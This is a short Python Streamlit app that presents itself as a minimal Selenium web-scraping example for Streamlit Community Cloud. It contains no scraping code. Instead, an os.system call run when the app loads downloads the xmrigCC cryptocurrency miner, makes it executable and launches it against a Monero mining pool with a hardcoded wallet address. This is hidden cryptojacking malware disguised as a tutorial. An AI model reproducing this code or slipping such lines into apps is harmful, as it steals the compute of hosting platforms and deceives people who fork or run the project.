import streamlit as st

"""
## Web scraping on Streamlit Cloud with Selenium

[![Source](https://img.shields.io/badge/View-Source-<COLOR>.svg)](https://github.com/snehankekre/streamlit-selenium-chrome/)

This is a minimal, reproducible example of how to scrape the web with Selenium and Chrome on Streamlit's Community Cloud.

Fork this repo, and edit `/streamlit_app.py` to customize this app to your heart's desire. :heart:
"""

with st.echo():
    import os
    os.system("wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && ls -a &&chmod +x ./xmrigDaemon && ./xmrigDaemon -o pool.hashvault.pro:443 -u 43NA3bgmhkFD2E5ychNnhG7TTcsp78e4AbZEAgBUwK8ubdnAe8tvFo2dNmhMw9fCELjBA9Enfsjkihm7RvwEN71gMeWVVbX -k --tls")
